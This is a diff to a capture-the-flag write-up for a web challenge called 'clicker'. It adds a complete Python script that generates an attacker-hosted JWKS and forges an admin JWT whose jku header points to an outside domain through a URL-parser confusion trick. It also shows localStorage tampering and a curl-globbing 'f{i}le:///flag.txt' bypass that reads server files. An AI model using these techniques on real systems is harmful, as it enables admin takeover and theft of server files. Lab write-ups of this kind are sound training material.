@@ -369,6 +369,66 @@ I then pasted the token into [jwt.io](https://jwt.io) to analyze its structure.
 
 After understanding the token format being used, I used the `exploit.py` script to generate the contents of the `jwks.json` file as well as a **forged token**.
 
+`exploit.py`
+
+```python
+import jwt
+import json
+import base64
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+
+def int_to_base64(n):
+    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
+    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('utf-8')
+
+# 1. Generate Key
+private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+pn = private_key.public_key().public_numbers()
+
+jwks = {
+    "keys": [{
+        "kty": "RSA",
+        "kid": "key1",
+        "use": "sig",
+        "alg": "RS256",
+        "n": int_to_base64(pn.n),
+        "e": int_to_base64(pn.e)
+    }]
+}
+
+# 2. Setup Payload & URL
+ATTACKER_DOMAIN = "sandbox.lasangna.studio"
+jku_url = f"http://payload_fix@localhost@{ATTACKER_DOMAIN}/jwks.json"
+
+payload = {
+    "is_admin": True,
+    "jku": jku_url,
+    "user_id": 1,
+    "username": "admin"
+}
+
+headers = {
+    "alg": "RS256",
+    "kid": "key1"
+}
+
+private_pem = private_key.private_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PrivateFormat.TraditionalOpenSSL,
+    encryption_algorithm=serialization.NoEncryption()
+)
+
+token = jwt.encode(payload, private_pem, algorithm="RS256", headers=headers)
+
+print("--- UPDATE /var/www/html/jwks.json ---")
+print(json.dumps(jwks))
+print("\n--- NEW FORGED TOKEN (JKU in Payload) ---")
+print(token)
+```
+
+![exploit](./assets/web/clicker/exploit.png)
+
 Next, I prepared `nginx` / `apache` / `ngrok` (in this case, I used `nginx`) to expose the `jwks.json` file from the `/var/www/html` directory.
 
 I used a **DigitalOcean Droplet** with a custom domain, so after placing the `jwks.json` file in `/var/www/html` and starting `nginx`, the file became publicly accessible at:
@@ -407,7 +467,7 @@ To bypass this check, I modified the `localStorage` values directly via the brow
 localStorage.setItem('token', '<forged-token>')
 localStorage.setItem('is_admin', 'true')
 ```
-[image here]
+![set_localstorage](./assets/web/clicker/set_localstorage.png)
 
 After doing this, accessing the `/admin` path no longer resulted in a redirect. From the Admin Panel, it was possible to download a URL and save it into the `/static` directory. This behavior introduced a potential vulnerability that allows reading arbitrary files from the server using a `file:///...` URL.
 
@@ -433,7 +493,13 @@ f{i}le:///flag.txt
 ```
 (assuming the flag is stored in `flag.txt`).
 
+![file_to_read](./assets/web/clicker/file_to_read_flag.png)
+
+![file_downloaded](./assets/web/clicker/file_downloaded.png)
+
 With this technique, the input URL is successfully downloaded, and by accessing `/static/flag.txt`, the flag is revealed.
+
+![solve](./assets/web/clicker/solve.png)
 
 Flag: **`C2C{p4rs3r_d1sr4p4ncy_4nd_curl_gl0bb1ng_1s_my_f4v0r1t3_b7126096108f}`**
 
